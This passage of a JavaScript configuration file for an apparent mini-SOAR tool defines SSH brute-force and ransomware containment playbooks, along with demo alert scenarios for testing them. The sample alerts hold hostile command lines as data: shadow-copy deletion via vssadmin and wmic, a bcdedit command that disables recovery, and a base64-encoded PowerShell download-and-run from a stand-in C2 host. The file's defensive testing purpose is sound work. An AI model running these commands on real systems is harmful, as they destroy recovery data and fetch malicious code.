      { id: "b-3b", source_id: "act-ssh-abuse", destination_id: "act-ssh-scorer", label: "" },
      { id: "b-3c", source_id: "act-ssh-history", destination_id: "act-ssh-scorer", label: "History Data" },
      { id: "b-4", source_id: "act-ssh-scorer", destination_id: "act-ssh-branch", label: "" },
      { id: "b-5", source_id: "act-ssh-branch", destination_id: "act-ssh-3", label: "TRUE (Score >= 65)", branch_type: "true" },
      { id: "b-6", source_id: "act-ssh-3", destination_id: "act-ssh-remote", label: "" },
      { id: "b-6b", source_id: "act-ssh-remote", destination_id: "act-ssh-4", label: "" },
      { id: "b-7", source_id: "act-ssh-4", destination_id: "act-ssh-5", label: "" },
      { id: "b-8", source_id: "act-ssh-branch", destination_id: "act-ssh-monitor", label: "FALSE (Monitor)", branch_type: "false" }
    ]
  },
  "wf-ransomware-01": {
    id: "wf-ransomware-01",
    name: "Playbook 2: Ransomware Emergency Containment",
    description: "Thu thập chứng cứ /proc, phân tích MITRE T1490, diệt PID mã độc, cô lập mạng máy chủ và gửi cảnh báo khẩn",
    triggers: [
      {
        id: "trig-rw-1",
        name: "WEBHOOK_TRIGGER",
        label: "Node 1: EDR Detection Trigger",
        app_id: "app-webhook",
        app_name: "Webhook Trigger",
        app_type: "trigger",
        large_image: "/images/apps/webhook.svg",
        position: { x: 80, y: 220 },
        parameters: [
          { name: "endpoint_url", value: "http://localhost:8080/api/v1/alerts/ransomware", description: "EDR Webhook Ingestion URL" },
          { name: "auth_header", value: "X-SOAR-API-KEY", description: "API Secret Key Header" },
          { name: "payload_format", value: "JSON (RFC Standard Alert Schema)", description: "Định dạng Payload chuẩn" }
        ],
        outputs: [
          { name: "alert_id", type: "number", example: 101, description: "MySQL alert record ID created by webhook ingest" },
          { name: "alert_type", type: "string", example: "RANSOMWARE_DETECTION", description: "Normalized alert category" },
          { name: "severity", type: "string", example: "CRITICAL", description: "Initial alert severity from backend ingest" },
          { name: "hostname", type: "string", example: "ws-finance-dept04", description: "Target endpoint hostname" },
          { name: "host_ip", type: "string", example: "10.0.4.88", description: "Target endpoint IP used by SSH containment" },
          { name: "process_id", type: "number", example: 5120, description: "Suspicious process PID" },
          { name: "pid", type: "number", example: 5120, description: "Alias for process_id" },
          { name: "process_name", type: "string", example: "vssadmin.exe", description: "Suspicious process name" },
          { name: "command_line", type: "string", example: "vssadmin.exe Delete Shadows /All /Quiet", description: "Suspicious process command line" },
          { name: "suspicious_extensions", type: "array", example: [".lockbit", ".locked"], description: "Observed encrypted file extensions" },
          { name: "affected_file_count", type: "number", example: 480, description: "Number of affected/encrypted files" },
          { name: "description", type: "string", example: "EDR Sysmon Alert: shadow copy deletion", description: "Human-readable EDR summary" },
          { name: "raw_event", type: "object", example: { "target_asset": {}, "malware_forensics": {} }, description: "Original EDR payload after normalization" },
          { name: "status", type: "string", example: "NEW", description: "Alert status after ingest" },
          { name: "created_at", type: "string", example: "2026-09-03T11:40:15Z", description: "Backend alert creation time" },
          { name: "data_source", type: "string", example: "REAL_WEBHOOK_INGESTED", description: "Output provenance" }
        ]
      }
    ],
    actions: [
      {
        id: "act-rw-1",
        name: "GET_PROCESS_FORENSICS",
        label: "Node 2: Forensic Snapshot (/proc)",
        app_id: "app-sentinel",
        app_name: "Host Process Sentinel",
        app_type: "action",
        large_image: "/images/apps/sentinel.svg",
        position: { x: 380, y: 220 },
        parameters: [
          { name: "hostname", value: "$trig-rw-1.hostname", description: "Target hostname" },
          { name: "host_ip", value: "$trig-rw-1.host_ip", description: "Target host IP" },
          { name: "pid", value: "$trig-rw-1.process_id", description: "PID to inspect" },
          { name: "process_name", value: "$trig-rw-1.process_name", description: "Process name from EDR" },
          { name: "command_line", value: "$trig-rw-1.command_line", description: "Command line from EDR" },
          { name: "affected_file_count", value: "$trig-rw-1.affected_file_count", description: "Affected file count" }
        ]
      },
      {
        id: "act-rw-2",
        name: "ANALYZE_MITRE_TTPS",
        label: "Node 3: MITRE T1490 Heuristic Engine",
        app_id: "app-threatintel",
        app_name: "Dynamic Security Scorer",
        app_type: "scorer",
        large_image: "/images/apps/threatintel.svg",
        position: { x: 680, y: 220 },
        parameters: [
          { name: "hostname", value: "$trig-rw-1.hostname", description: "Host name" },
          { name: "process_id", value: "$act-rw-1.pid", description: "Process ID" },
          { name: "process_name", value: "$trig-rw-1.process_name", description: "Process name" },
          { name: "command_line", value: "$act-rw-1.cmdline", description: "Extracted commandline" },
          { name: "crypto_extension", value: "$trig-rw-1.suspicious_extensions", description: "Encrypted extensions" },
          { name: "affected_file_count", value: "$trig-rw-1.affected_file_count", description: "Affected file count" }
        ]
      },
      {
        id: "act-rw-branch",
        name: "EVALUATE_CONDITION",
        label: "Node 4: Decision Rule (Risk Score >= 75)",
        app_id: "app-branch",
        app_name: "Branch Condition",
        app_type: "branch",
        large_image: "/images/apps/branch.svg",
        position: { x: 980, y: 220 },
        parameters: [
          { name: "source_variable", value: "$act-rw-2.risk_score", description: "Evaluated Risk Score" },
          { name: "condition_operator", value: "larger than or equal", description: "Operator" },
          { name: "target_value", value: "75", description: "Containment Threshold" }
        ]
      },
      {
        id: "act-rw-3",
        name: "KILL_PID",
        label: "Node 5: Host Sentinel Kill PID Tree",
        app_id: "app-sentinel",
        app_name: "Host Process Sentinel",
        app_type: "action",
        large_image: "/images/apps/sentinel.svg",
        position: { x: 1280, y: 120 },
        parameters: [
          { name: "pid", value: "$act-rw-2.process_id", description: "PID to kill" },
          { name: "signal", value: "SIGKILL", description: "Signal -9" },
          { name: "hostname", value: "$act-rw-2.hostname", description: "Host context" },
          { name: "process_name", value: "$act-rw-2.process_name", description: "Process context" }
        ]
      },
      {
        id: "act-rw-4",
        name: "QUARANTINE_HOST",
        label: "Node 6: Host Network Isolation",
        app_id: "app-iptables",
        app_name: "Linux IPTables Firewall",
        app_type: "firewall",
        large_image: "/images/apps/iptables.svg",
        position: { x: 1580, y: 120 },
        parameters: [
          { name: "hostname", value: "$act-rw-3.hostname", description: "Host to isolate" },
          { name: "interface", value: "eth0", description: "Interface" }
        ]
      },
      {
        id: "act-rw-5",
        name: "EXECUTE_REMOTE_SSH",
        label: "Node 7: SSH Remote VPS Containment",
        app_id: "app-ssh-exec",
        app_name: "SSH Remote VPS Connector",
        app_type: "action",
        large_image: "/images/apps/ssh.svg",
        position: { x: 1880, y: 120 },
        parameters: [
          { name: "ip_address", value: "$trig-rw-1.host_ip", description: "Địa chỉ IP VPS / server SSH cần containment" },
          { name: "username", value: "ec2-user", description: "SSH Username" },
          { name: "port", value: "22", description: "SSH Port" },
          { name: "pem_file", value: "/run/secrets/pnreal-dev.pem", description: "File .pem trên backend/container" },
          { name: "password", value: "", description: "SSH password nếu không dùng key" },
          { name: "command", value: "whoami && hostname && echo DRY_RUN_CONTAINMENT pid=$act-rw-3.killed_pid host=$trig-rw-1.host_ip", description: "Remote containment command" },
          { name: "timeout_seconds", value: "10", description: "Timeout" }
        ]
      },
      {
        id: "act-rw-6",
        name: "LOG_RANSOMWARE_INCIDENT",
        label: "Node 8: MySQL Incident Logger",
        app_id: "app-mysqldb",
        app_name: "MySQL DB Logger",
        app_type: "action",
        large_image: "/images/apps/mysql.svg",
        position: { x: 2180, y: 120 },
        parameters: [
          { name: "alert_id", value: "$trig-rw-1.alert_id", description: "Related alert ID" },
          { name: "hostname", value: "$act-rw-4.hostname", description: "Involved host" },
          { name: "process_name", value: "$act-rw-3.process_name", description: "Malicious process" },
          { name: "pid", value: "$act-rw-3.killed_pid", description: "Killed PID" },
          { name: "affected_files", value: "$trig-rw-1.affected_file_count", description: "Affected file count" },
          { name: "status", value: "CONTAINED", description: "Containment state" }
        ]
      },
      {
        id: "act-rw-7",
        name: "SEND_SOC_ALERT",
        label: "Node 9: Telegram Emergency Dispatch",
        app_id: "app-telegram",
        app_name: "Telegram Incident Notifier",
        app_type: "action",
        large_image: "/images/apps/telegram.svg",
        position: { x: 2480, y: 120 },
        parameters: [
          { name: "bot_token", value: "7891234567:AAFx_TELEGRAM_BOT_TOKEN_SOAR", description: "Telegram Bot Token" },
          { name: "chat_id", value: "@mini_soar_alerts_channel", description: "Telegram Channel / Chat ID" },
          { name: "severity", value: "$act-rw-2.severity", description: "Emergency Severity" },
          { name: "message_html", value: "<b>🚨 [MINI-SOAR EMERGENCY] RANSOMWARE CONTAINMENT</b><br><br>• <b>Severity</b>: <code>$act-rw-2.severity</code> (Score: $act-rw-2.risk_score/100)<br>• <b>Victim Host</b>: <code>$trig-rw-1.hostname</code> ($trig-rw-1.host_ip)<br>• <b>Malicious Process</b>: <code>$trig-rw-1.process_name</code> (PID: $trig-rw-1.process_id)<br>• <b>Command Line</b>: <code>$trig-rw-1.command_line</code><br>• <b>Affected Files</b>: <code>$trig-rw-1.affected_file_count</code><br>• <b>MITRE TTP</b>: <code>T1490 (Inhibit Recovery)</code><br>• <b>Action Taken</b>: <code>PROCESS_KILLED_HOST_ISOLATED</code>", description: "HTML Alert Body" }
        ]
      },
      {
        id: "act-rw-monitor",
        name: "QUERY_ASSET_CRITICALITY",
        label: "Node 6b: Audit & Monitoring Log",
        app_id: "app-mysqldb",
        app_name: "MySQL DB Logger",
        app_type: "action",
        large_image: "/images/apps/mysql.svg",
        position: { x: 1280, y: 340 },
        parameters: [
          { name: "hostname", value: "$act-rw-2.hostname", description: "Audited host" },
          { name: "note", value: "Ransomware risk score < 75. Monitoring only; no containment executed.", description: "Audit Note" }
        ]
      }
    ],
    branches: [
      { id: "rb-1", source_id: "trig-rw-1", destination_id: "act-rw-1", label: "" },
      { id: "rb-direct-1-3", source_id: "trig-rw-1", destination_id: "act-rw-2", label: "Alert Context" },
      { id: "rb-2", source_id: "act-rw-1", destination_id: "act-rw-2", label: "" },
      { id: "rb-3", source_id: "act-rw-2", destination_id: "act-rw-branch", label: "" },
      { id: "rb-4", source_id: "act-rw-branch", destination_id: "act-rw-3", label: "TRUE (Score >= 75)", branch_type: "true" },
      { id: "rb-5", source_id: "act-rw-3", destination_id: "act-rw-4", label: "" },
      { id: "rb-6", source_id: "act-rw-4", destination_id: "act-rw-5", label: "SSH Execute" },
      { id: "rb-7", source_id: "act-rw-5", destination_id: "act-rw-6", label: "" },
      { id: "rb-9", source_id: "act-rw-6", destination_id: "act-rw-7", label: "" },
      { id: "rb-8", source_id: "act-rw-branch", destination_id: "act-rw-monitor", label: "FALSE (Monitor)", branch_type: "false" }
    ]
  }
};

const DEMO_TEST_SCENARIOS = {
  ssh: [
    {
      id: "ssh-tor",
      name: "IP Độc Hại Cao (Tor / Botnet: 185.220.101.5)",
      file: "demo/ssh_scenarios/alert_ssh_malicious_ru.json",
      payload: {
        source_ip: "185.220.101.5",
        hostname: "srv-prod-ssh01",
        username: "root",
        failed_attempts: 18,
        description: "Massive SSH Brute-force from known Tor Exit Node / Scanner (185.220.101.5)"
      }
    },
    {
      id: "ssh-vn",
      name: "IP Trong Nước (Viettel ISP: 116.108.12.98)",
      file: "demo/ssh_scenarios/alert_ssh_vietnam.json",
      payload: {
        source_ip: "116.108.12.98",
        hostname: "srv-prod-ssh01",
        username: "deploy",
        failed_attempts: 7,
        description: "SSH Brute-force from domestic IP (116.108.12.98 - Viettel Group, Vietnam)"
      }
    },
    {
      id: "ssh-lan",
      name: "IP Mạng Nội Bộ (Private Subnet: 192.168.1.105)",
      file: "demo/ssh_scenarios/alert_ssh_internal_lan.json",
      payload: {
        source_ip: "192.168.1.105",
        hostname: "srv-prod-ssh01",
        username: "ubuntu",
        failed_attempts: 12,
        description: "Suspicious internal lateral movement SSH attempt from workstation 192.168.1.105"
      }
    },
    {
      id: "ssh-aws",
      name: "IP Cloud Datacenter (AWS Scanner: 54.214.24.120)",
      file: "demo/ssh_scenarios/alert_ssh_cloud_scanner.json",
      payload: {
        source_ip: "54.214.24.120",
        hostname: "srv-prod-ssh01",
        username: "test",
        failed_attempts: 5,
        description: "Cloud automated vulnerability scan targeting SSH from AWS Oregon (54.214.24.120)"
      }
    }
  ],
  ransomware: [
    {
      id: "rw-lockbit",
      name: "LockBit 3.0 (vssadmin Delete Shadows)",
      file: "demo/ransomware_scenarios/alert_ransomware_vssadmin_lockbit.json",
      payload: {
        hostname: "ws-finance-dept04",
        hostIp: "10.0.4.88",
        processName: "vssadmin.exe",
        commandLine: "vssadmin.exe Delete Shadows /All /Quiet",
        pid: 5120,
        suspiciousExtensions: [".lockbit", ".locked"],
        affectedFileCount: 480,
        description: "EDR Sysmon Alert: LockBit 3.0 volume shadow copy deletion (T1490) by PID 5120"
      }
    },
    {
      id: "rw-alphv",
      name: "BlackCat / ALPHV (WMIC Shadowcopy Delete)",
      file: "demo/ransomware_scenarios/alert_ransomware_wmic_alphv.json",
      payload: {
        hostname: "srv-prod-db02",
        hostIp: "10.0.2.20",
        processName: "wmic.exe",
        commandLine: "wmic.exe shadowcopy delete /nointeractive",
        pid: 6244,
        suspiciousExtensions: [".alphv", ".crypto"],
        affectedFileCount: 1250,
        description: "EDR Sysmon Alert: BlackCat/ALPHV shadowcopy deletion via WMIC (T1490) targeting Database Server"
      }
    },
    {
      id: "rw-dropper",
      name: "Phishing Dropper (PowerShell mã hóa Base64)",
      file: "demo/ransomware_scenarios/alert_ransomware_powershell_dropper.json",
      payload: {
        hostname: "ws-hr-manager01",
        hostIp: "10.0.5.12",
        processName: "powershell.exe",
        commandLine: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB4AHkAegAvAGUAeABlACcAKQA=",
        pid: 7820,
        suspiciousExtensions: [".encrypted"],
        affectedFileCount: 95,
        description: "EDR Sysmon Alert: Malicious Encoded PowerShell spawned from Outlook.exe downloading payload"
      }
    },
    {
      id: "rw-wannacry",
      name: "WannaCry Artifact (bcdedit Recovery Disable)",
      file: "demo/ransomware_scenarios/alert_ransomware_bcdedit_wannacry.json",
      payload: {
        hostname: "srv-prod-backup01",
        hostIp: "10.0.1.50",
        processName: "bcdedit.exe",
        commandLine: "bcdedit.exe /set {default} recoveryenabled No",
        pid: 3108,
        suspiciousExtensions: [".wnry"],
        affectedFileCount: 3200,
        description: "EDR Sysmon Alert: Recovery mode disabled via bcdedit (T1490) and massive file locking (.wnry)"
      }
    }
  ]
};

export function getDefaultScenarioValue(key, playbookId = 'wf-ssh-01') {
  const isRw = playbookId && playbookId.includes('ransomware');
  const scen = isRw ? DEMO_TEST_SCENARIOS.ransomware[0] : DEMO_TEST_SCENARIOS.ssh[0];
  if (!scen || !scen.payload) return undefined;
  
  if (scen.payload[key] !== undefined) return scen.payload[key];

  // Map common field name variants
  if (key === 'source_ip' || key === 'attacker_ip' || key === 'queried_ip' || key === 'ip_analyzed') return scen.payload.source_ip || '185.220.101.5';
  if (key === 'ip_address') return scen.payload.source_ip || '185.220.101.5';
  if (key === 'hostname') return scen.payload.hostname || (isRw ? 'ws-finance-dept04' : 'srv-prod-ssh01');
  if (key === 'host_ip') return scen.payload.hostIp || '10.0.4.88';
  if (key === 'username') return scen.payload.username || 'root';
  if (key === 'process_id' || key === 'pid' || key === 'killed_pid') return scen.payload.pid || 5120;
  if (key === 'process_name') return scen.payload.processName || 'vssadmin.exe';
  if (key === 'command_line' || key === 'cmdline') return scen.payload.commandLine || 'vssadmin.exe Delete Shadows /All /Quiet';
  if (key === 'affected_files' || key === 'affected_file_count') return scen.payload.affectedFileCount || 480;
  if (key === 'suspicious_extensions' || key === 'crypto_extension') return scen.payload.suspiciousExtensions || ['.lockbit', '.locked'];
  if (key === 'failed_attempts') return scen.payload.failed_attempts || 18;
  if (key === 'country') return 'Netherlands';
  if (key === 'country_code') return 'NL';
  if (key === 'city') return 'Amsterdam';
  if (key === 'isp') return 'Tor Exit Relays';
  if (key === 'threat_score' || key === 'total_score' || key === 'risk_score') return 100;
  if (key === 'severity' || key === 'calculated_severity') return 'CRITICAL';
  if (key === 'history_penalty' || key === 'history_penalty_score') return 25;
  if (key === 'is_repeat_offender') return true;
  if (key === 'is_private_lan') return false;
  if (key === 'status') return 'SUCCESS';
  if (key === 'alert_id') return 101;
  if (key === 'command_executed') return 'sudo iptables -C INPUT -s 185.220.101.5 -p tcp --dport 22 -j DROP';
  return undefined;
}

export function resolveValue(val, outputs = {}, playbookId = 'wf-ssh-01') {
  if (val === null || val === undefined) return '';
  if (typeof val !== 'string') return val;

  // Exact reference "$nodeId.key"
  const exactMatch = val.match(/^\$([a-zA-Z0-9_-]+)\.([a-zA-Z0-9_]+)$/);
  if (exactMatch) {
    const [, sourceId, key] = exactMatch;
    if (outputs[sourceId] && outputs[sourceId][key] !== undefined && outputs[sourceId][key] !== null) {
      return outputs[sourceId][key];
    }
    const fallback = getDefaultScenarioValue(key, playbookId);
    if (fallback !== undefined) return fallback;
    return val;
  }

  // Embedded reference(s) "...$nodeId.key..."
  if (val.includes('$')) {
    return val.replace(/\$([a-zA-Z0-9_-]+)\.([a-zA-Z0-9_]+)/g, (match, sourceId, key) => {
      if (outputs[sourceId] && outputs[sourceId][key] !== undefined && outputs[sourceId][key] !== null) {
        const outVal = outputs[sourceId][key];
        return typeof outVal === 'object' ? JSON.stringify(outVal) : String(outVal);
      }
      const fallback = getDefaultScenarioValue(key, playbookId);
      if (fallback !== undefined) {
        return typeof fallback === 'object' ? JSON.stringify(fallback) : String(fallback);
      }
      return match;
    });
  }

  return val;
}

export { DEFAULT_APPS, PRESET_WORKFLOWS, DEMO_TEST_SCENARIOS };
